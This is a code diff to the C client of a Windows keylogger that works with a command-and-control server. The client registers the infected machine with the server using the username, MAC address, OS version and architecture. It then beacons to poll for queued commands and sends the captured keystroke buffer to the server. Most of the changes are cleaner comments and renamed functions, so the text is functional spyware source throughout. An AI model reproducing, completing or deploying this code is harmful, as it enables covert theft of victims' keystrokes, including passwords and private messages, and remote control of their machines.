@@ -5,8 +5,11 @@ static void retrieveVersionInfo(char* version);
 static void retrieveArchInfo(char* arch);
 
 /**
- * Initialises the client structure, retrieves the username and computername
- * of the client and stores it as their ID. Then generates two and internet and 
+ * Initialises the client structure, retrieves the current users username and MAC address
+ * and stores it as their ID. Then establishes a connection with the C2 and stores the 
+ * internet handles in the client structure for future use
+ * 
+ * @return newly allocated CLIENT_HANDLER struct address
  */
 CLIENT_HANDLER* initClient() {
     CLIENT_HANDLER* client = malloc(sizeof(CLIENT_HANDLER));
@@ -40,19 +43,21 @@ CLIENT_HANDLER* initClient() {
 
 
 /**
- * Retrieev all cleint registration information and sent it to the server.
+ * Retrieve all cleint registration information and sent it to the server.
  * The server responds with the random encoding key which is stored in the
  * key logger
+ * 
+ * @param client the client to register
+ * @param progContextKey the program context (ctx) key to be initialised
+ * @return flag associated with the success/failure of this operation
  */
 RET_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey) {
     time_t seconds = getCurrentTime();
 
-    // retrieve and encode version and architecture
     char version[32];
-    retrieveVersionInfo(version);
-
+    retrieveVersionInfo(version); // retrieve version info
     char arch[16];
-    retrieveArchInfo(arch);
+    retrieveArchInfo(arch);       // retrieve architecture info
 
     // send the register data that includes system infomation!
     char registerStr[MAX_MSG_LEN];
@@ -60,7 +65,7 @@ RET_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey) {
 
     // (ab)uses GET request to send os fingerprint
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", registerStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
-    if (hRequest == NULL) { return R_NULL; }
+    if (hRequest == NULL) { printf("1\n"); return R_NULL; }
 
     // send the register request
     if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
@@ -73,23 +78,18 @@ RET_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey) {
     unsigned char key[2];
     if (!InternetReadFile(hRequest, key, 1, &bytesRead) && bytesRead != 0) { return R_GET; }
 
-    DWORD statusCode = 0;
-    DWORD size = sizeof(DWORD);  // check the response was not err code 400, i.e. this user is aleady registered
-    if (HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &size, NULL)) {
-        if (statusCode == 400) { return R_GET; }
-    }
-
     // set the program context encoding key
     *progContextKey = key[0];
 
-    printf("\nSECRET: '%02X'\n", *progContextKey);
     InternetCloseHandle(hRequest);
     return R_SUCCESS;
 }
 
 /**
- * retrieve the wiundwos version information to be sent as part
- * of the register 
+ * retrieve the Windows version information to be sent as part
+ * of the client register
+ * 
+ * @param version reciever for version information
  */
 static void retrieveVersionInfo(char* version) {
     OSVERSIONINFOA vInfo =  { 0 };   // gets version information
@@ -103,7 +103,9 @@ static void retrieveVersionInfo(char* version) {
 
 /**
  * retrieves the architecture string associated with the client 
- * machine
+ * machine to also be sent during registration
+ * 
+ * @param arch reciever for architecture information
  */
 static void retrieveArchInfo(char* arch) {
     SYSTEM_INFO sInfo;   // get architecture information
@@ -126,7 +128,11 @@ static void retrieveArchInfo(char* arch) {
 }
 
 /**
- * performs an HTTP GET request to the server to get all the this client queued commands
+ * Performs an HTTP GET request to the server to get all the this client queued commands. 
+ * This mthod also serves as a "beaconing" to the server to tell it "I am still active"
+ * 
+ * @param client the current client
+ * @return flag associated with result of this operation
  */
 RET_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
     time_t seconds = getCurrentTime();
@@ -156,10 +162,12 @@ RET_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
 }
 
 /**
- * Write the client buffer to the servers logs. Afterwhich clear the buffer
- * Note: checking of buffer length is handled in program.c
+ * Simply send the key log buffer to the C2!
+ * 
+ * @param client the current client
+ * @param kLogger key logger struct which contains captured key strokes
  */
-RET_CODE writeKeyLog(CLIENT_HANDLER* client, KEY_LOGGER* kLogger) {
+RET_CODE writeLogToC2(CLIENT_HANDLER* client, KEY_LOGGER* kLogger) {
     char logStr[MAX_MSG_LEN];
     snprintf(logStr, MAX_MSG_LEN, "/logs/%s", client->id);
 
@@ -173,12 +181,16 @@ RET_CODE writeKeyLog(CLIENT_HANDLER* client, KEY_LOGGER* kLogger) {
     return R_SUCCESS;
 }
 
+/**
+ * Simply free all memory asscoated with a client struct
+ * 
+ * @param client the curretn client
+ */
 void clientCleanup(CLIENT_HANDLER *client) {
     if (client == NULL) { return; }
 
     // close internet handles
     if (client->hConnect != NULL) { InternetCloseHandle(client->hConnect); }
     if (client->hSession != NULL) { InternetCloseHandle(client->hSession); }
-    
     free(client);
 }
